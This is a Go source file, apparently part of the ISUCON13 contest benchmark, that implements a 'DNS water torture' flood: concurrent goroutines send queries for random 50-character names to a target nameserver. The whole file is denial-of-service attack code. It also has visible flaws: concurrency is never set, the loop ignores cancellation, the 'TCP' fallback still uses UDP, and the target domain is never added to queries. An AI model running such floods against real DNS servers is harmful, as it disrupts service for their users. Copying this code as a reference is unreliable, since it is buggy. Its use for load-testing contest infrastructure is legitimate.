package attacker

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/isucon/isucon13/bench/internal/config"
	"github.com/miekg/dns"
)

const (
	asciiLowercase = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	specialChars   = "-."
)

type DnsWaterTortureAttacker struct {
	resolver     *dns.Client
	targetDomain string
	concurrency  int
}

func NewDnsWaterTortureAttacker(nameserver string, targetDomain string, concurrency int) *DnsWaterTortureAttacker {
	return &DnsWaterTortureAttacker{
		resolver:     &dns.Client{Net: "udp", DialTimeout: time.Nanosecond},
		targetDomain: targetDomain,
	}
}

func (a *DnsWaterTortureAttacker) makePayload(length int) string {
	buf := make([]byte, length)
	for idx := range buf {
		if idx != 0 && rand.Intn(5)%2 == 0 {
			buf[idx] = specialChars[rand.Intn(len(specialChars))]
		} else {
			buf[idx] = asciiLowercase[rand.Intn(len(asciiLowercase))]
		}
	}
	return string(buf)
}

func (a *DnsWaterTortureAttacker) attack(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
		default:
			payload := a.makePayload(50)
			m := &dns.Msg{}
			m = m.SetQuestion(payload, dns.StringToType["A"])
			addr := net.JoinHostPort(config.TargetNameserver, strconv.Itoa(config.DNSPort))
			r, _, err := a.resolver.ExchangeContext(ctx, m, addr)

			if err != nil {
				return err
			}

			if r.Truncated {
				tcpClient := &dns.Client{Net: "udp", DialTimeout: time.Nanosecond}
				r, _, err = tcpClient.ExchangeContext(ctx, m, addr)
				if err != nil {
					return err
				}
			}

			if r.Rcode != dns.RcodeSuccess {
				return fmt.Errorf("failed to resolve '%s'. rcode:%s", payload, dns.RcodeToString[r.Rcode])
			}
		}
	}
}

func (a *DnsWaterTortureAttacker) Attack(ctx context.Context) error {
	var wg sync.WaitGroup
	for i := 0; i < a.concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			a.attack(ctx)
		}()
	}

	<-ctx.Done()
	wg.Wait()

	return nil
}
